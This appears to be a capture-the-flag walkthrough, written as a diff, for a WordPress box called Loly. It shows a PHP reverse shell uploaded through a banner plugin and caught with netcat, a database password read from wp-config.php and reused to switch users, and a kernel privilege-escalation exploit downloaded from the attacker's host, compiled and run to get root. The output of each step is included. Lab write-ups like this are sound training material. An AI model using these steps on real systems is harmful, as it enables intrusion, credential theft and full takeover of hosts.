@@ -9,9 +9,94 @@
 
 
 
+we must use the AdRotate banner upload to get a revshell.
+upon visiting
+http://loly.lc/wordpress/wp-content/banners/revshellphp.php
+
+the file is downloaded, but also executed.
+
+we use php pentestmonkey
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [192.168.45.212] from (UNKNOWN) [192.168.243.121] 44636
+Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+ 19:43:28 up  1:36,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
 
 
 
+we see that loly is the only user in /home
+
+we find credentials inside wp-config
+
+
+www-data@ubuntu:~/html/wordpress$ cat wp-config.php 
+<?php
+/**
+...
+/** MySQL database password */
+define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
+
+
+
+www-data@ubuntu:~/html/wordpress$ su loly
+Password: 
+loly@ubuntu:/var/www/html/wordpress$ sudo -l
+[sudo] password for loly: 
+Sorry, user loly may not run sudo on ubuntu.
+loly@ubuntu:/var/www/html/wordpress$ 
+
+
+
+loly@ubuntu:/var/www/html/wordpress$ uname -a
+Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+loly@ubuntu:/var/www/html/wordpress$ 
+
+
+
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation      | linux/local/45010.c
+
+
+
+
+loly@ubuntu:~$ wget http://192.168.45.212/45010.c
+--2025-11-16 19:59:24--  http://192.168.45.212/45010.c
+Connecting to 192.168.45.212:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13176 (13K) [text/x-csrc]
+Saving to: ‘45010.c’
+
+45010.c                       100%[==============================================>]  12.87K  --.-KB/s    in 0.03s   
+
+2025-11-16 19:59:24 (437 KB/s) - ‘45010.c’ saved [13176/13176]
+
+loly@ubuntu:~$ gcc 45010.c -o exploit
+loly@ubuntu:~$ chmod +x exploit
+loly@ubuntu:~$ ./exploit
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff880035c36900
+[*] Leaking sock struct from ffff880034bd43c0
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff8800349670c0
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff8800349670c0
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
+# 
 
 
 
